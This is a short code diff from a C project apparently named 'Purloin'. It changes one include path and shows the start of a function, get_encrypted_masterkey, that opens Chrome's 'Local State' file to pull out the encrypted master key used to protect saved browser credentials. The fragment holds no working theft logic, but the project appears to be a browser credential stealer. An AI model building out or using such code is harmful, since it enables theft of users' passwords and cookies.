@@ -1,4 +1,4 @@
-#include "Purloin/Purloin_Chrome.h"
+#include "includes/Purloin_Chrome.h"
 
 BOOL get_encrypted_masterkey(PCWSTR browser_dir, PCWSTR data_file, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, WORD buf_outSize) {
 	FILE* fp_local_state_file = NULL;												// File pointer to 'Local State' file
